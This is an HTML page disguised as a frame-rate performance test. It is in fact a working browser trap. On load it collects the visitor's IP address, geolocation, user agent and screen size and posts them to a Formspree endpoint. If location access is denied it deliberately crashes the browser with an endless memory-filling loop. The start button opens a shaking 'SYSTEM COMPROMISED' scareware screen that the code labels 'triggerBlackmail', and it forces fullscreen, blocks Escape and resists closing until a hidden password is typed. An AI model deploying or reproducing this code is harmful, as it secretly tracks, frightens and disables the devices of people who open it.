<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM LOCK</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #fff;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden;
            user-select: none;
        }

        /* Password Bar */
        #password-bar {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 30px;
            background: #111;
            border-bottom: 1px solid #333;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 999999999; 
            box-shadow: 0 2px 5px rgba(0,0,0,0.5);
        }

        .pass-input {
            background: transparent;
            border: none;
            border-bottom: 1px solid #555;
            color: #fff;
            font-size: 12px;
            padding: 5px;
            text-align: center;
            outline: none;
            width: 100px;
        }

        .pass-label {
            font-size: 10px;
            color: #777;
            margin-right: 10px;
        }

        /* FPS Display */
        #fps-display {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            z-index: 10;
            position: relative;
            transition: opacity 0.5s ease;
        }

        .fps-counter {
            font-size: 6rem;
            font-weight: bold;
            text-shadow: 0 0 10px #0f0;
            margin-bottom: 20px;
        }

        .start-btn {
            padding: 15px 30px;
            font-size: 1.2rem;
            background: #000;
            border: 2px solid #0f0;
            color: #0f0;
            cursor: pointer;
            box-shadow: 0 0 10px #0f0;
            transition: all 0.3s ease;
        }

        .start-btn:hover {
            background: #0f0;
            color: #000;
            box-shadow: 0 0 20px #0f0;
        }

        /* Trap Modal */
        #trap-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.99);
            z-index: 999999999; 
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            border: 5px solid red;
            box-sizing: border-box;
        }

        .modal-content {
            background: #111;
            padding: 30px;
            border: 2px solid red;
            max-width: 500px;
            box-shadow: 0 0 30px red;
            animation: shake 0.5s infinite;
        }

        h1 {
            color: red;
            font-size: 2.5rem;
            margin-bottom: 10px;
            text-transform: uppercase;
        }

        p {
            font-size: 1rem;
            line-height: 1.5;
            color: white;
        }

        .deny-warning {
            color: yellow;
            font-weight: bold;
            font-size: 1.2rem;
            border: 2px dashed yellow;
            padding: 10px;
            margin-bottom: 20px;
            background: #220000;
        }

        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            30% { transform: translate(3px, 2px) rotate(0deg); }
            40% { transform: translate(1px, -1px) rotate(1deg); }
            50% { transform: translate(-1px, 2px) rotate(-1deg); }
            60% { transform: translate(-3px, 1px) rotate(0deg); }
            70% { transform: translate(3px, 1px) rotate(-1deg); }
            80% { transform: translate(-1px, -1px) rotate(1deg); }
            90% { transform: translate(1px, 2px) rotate(0deg); }
            100% { transform: translate(1px, -2px) rotate(-1deg); }
        }

        body.locked {
            overflow: hidden;
        }
        
        .hidden-content {
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <!-- Secret Password Bar -->
    <div id="password-bar">
        <span class="pass-label">SECURE LOCK:</span>
        <input type="password" class="pass-input" id="secret-pass" placeholder="••••••" autocomplete="off">
    </div>

    <!-- FPS Display / Start Screen -->
    <div id="fps-display">
        <div class="fps-counter" id="fps-number">60</div>
        <p style="font-size: 1rem;">Optimal Performance Detected</p>
        <button class="start-btn" onclick="startTrap()">START PERFORMANCE TEST</button>
    </div>

    <!-- The Trap Modal -->
    <div id="trap-modal">
        <div class="modal-content">
            <h1>⚠️ SYSTEM COMPROMISED ⚠️</h1>
            
            <!-- The Warning -->
            <div class="deny-warning">
                WARNING: IF YOU DENY LOCATION, YOUR COMPUTER WILL CRASH!
            </div>

            <p><strong>Your IP Address:</strong> <span id="user-ip">Fetching...</span></p>
            <p><strong>Location:</strong> <span id="user-location">Detecting...</span></p>
            <p><strong>Status:</strong> Uploading Files...</p>
            <br>
            <p style="color: yellow;">DO NOT CLOSE THIS WINDOW.</p>
            
            <div id="email-status" style="margin-top: 10px; font-size: 0.7rem; color: #aaa;"></div>
        </div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xdegbbjj';

        // --- OBSCURED PASSWORD LOGIC ---
        const _0x1 = ['abc', '123']; 
        const _0x2 = _0x1[0] + _0x1[1]; 

        document.getElementById('secret-pass').addEventListener('keyup', function(e) {
            if (this.value === _0x2) {
                unlockSystem();
            }
        });

        function unlockSystem() {
            // Exit Fullscreen
            if (document.exitFullscreen) {
                document.exitFullscreen().catch(() => {});
            }
            
            // Hide Modal
            document.getElementById('trap-modal').style.display = 'none';
            
            // Show FPS again
            document.getElementById('fps-display').classList.remove('hidden-content');
            
            // Reset Body
            document.body.classList.remove('locked');
            window.isTrapped = false;
            
            // Clear Input
            document.getElementById('secret-pass').value = '';
            
            // Restart FPS counter
            updateFPS();
        }

        // Simulate FPS fluctuation
        let fpsInterval;
        function updateFPS() {
            const fpsElement = document.getElementById('fps-number');
            fpsInterval = setInterval(() => {
                const randomFPS = Math.floor(Math.random() * 10) + 55;
                fpsElement.innerText = randomFPS;
            }, 1000);
        }
        updateFPS();

        // 1. Fetch Real IP and Location Data
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                document.getElementById('user-ip').innerText = data.ip;
                
                // Request Geolocation
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            document.getElementById('user-location').innerText = `${lat}, ${lon}`;
                            sendFormData(data.ip, lat, lon);
                        },
                        () => {
                            // If blocked/denied
                            document.getElementById('user-location').innerText = "BLOCKED";
                            sendFormData(data.ip, "N/A", "N/A");
                            triggerCrash();
                        }
                    );
                } else {
                    document.getElementById('user-location').innerText = "Not Supported";
                    sendFormData(data.ip, "N/A", "N/A");
                    triggerCrash();
                }
            })
            .catch(() => {
                document.getElementById('user-ip').innerText = "127.0.0.1";
                document.getElementById('user-location').innerText = "Unknown";
                sendFormData("127.0.0.1", "Unknown", "Unknown");
                triggerCrash();
            });

        // Send Data to Formspree
        function sendFormData(ip, lat, lon) {
            const statusEl = document.getElementById('email-status');
            statusEl.innerText = "Sending data...";

            const formData = new FormData();
            formData.append('IP Address', ip);
            formData.append('Latitude', lat);
            formData.append('Longitude', lon);
            formData.append('User Agent', navigator.userAgent);
            formData.append('Screen Resolution', screen.width + 'x' + screen.height);

            fetch(FORMSPREE_ENDPOINT, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            }).then(response => {
                if (response.ok) {
                    statusEl.innerText = "Data Sent Successfully!";
                    statusEl.style.color = "#0f0";
                } else {
                    statusEl.innerText = "Connection unstable.";
                    statusEl.style.color = "red";
                }
            }).catch(error => {
                statusEl.innerText = "Error sending data.";
                statusEl.style.color = "red";
            });
        }

        // 2. The Trap Function
        function startTrap() {
            clearInterval(fpsInterval);
            
            const btn = document.querySelector('.start-btn');
            btn.innerText = "TESTING...";
            btn.disabled = true;

            setTimeout(() => {
                triggerBlackmail();
            }, 1000);
        }

        function triggerBlackmail() {
            const modal = document.getElementById('trap-modal');
            const fpsScreen = document.getElementById('fps-display');
            
            modal.style.display = 'flex';
            fpsScreen.classList.add('hidden-content');
            
            try {
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen();
                }
            } catch(e) {}
            
            document.body.classList.add('locked');
            window.isTrapped = true;
        }

        // The Crash Function (Memory Leak)
        function triggerCrash() {
            alert("YOU DENIED PERMISSION! SYSTEM CRASH IMMINENT!");
            let array = [];
            while(true) {
                array.push(new Array(1000000).join('X'));
            }
        }

        // Aggressive Loop for Fullscreen
        function startAggressiveLoop() {
            window.onbeforeunload = function(e) {
                e.preventDefault();
                e.returnValue = '';
                return '';
            };

            // Force fullscreen every 0.001 seconds
            setInterval(() => {
                const modal = document.getElementById('trap-modal');
                if (window.getComputedStyle(modal).display === 'none') {
                    modal.style.display = 'flex';
                    try { document.documentElement.requestFullscreen(); } catch(e){}
                }
                if (!document.hasFocus()) {
                    window.focus();
                }
            }, 1);
        }

        // Block Escape Key
        document.addEventListener('keydown', function(e) {
            if (e.key === "Escape") {
                e.preventDefault();
                document.getElementById('trap-modal').style.display = 'flex';
            }
        });

        // Enforce Fullscreen
        document.addEventListener('fullscreenchange', () => {
            if (window.isTrapped && !document.fullscreenElement) {
                document.documentElement.requestFullscreen().catch((err) => {
                    console.log("Fullscreen blocked by browser");
                });
            }
        });

        startAggressiveLoop();
    </script>
</body>
</html>
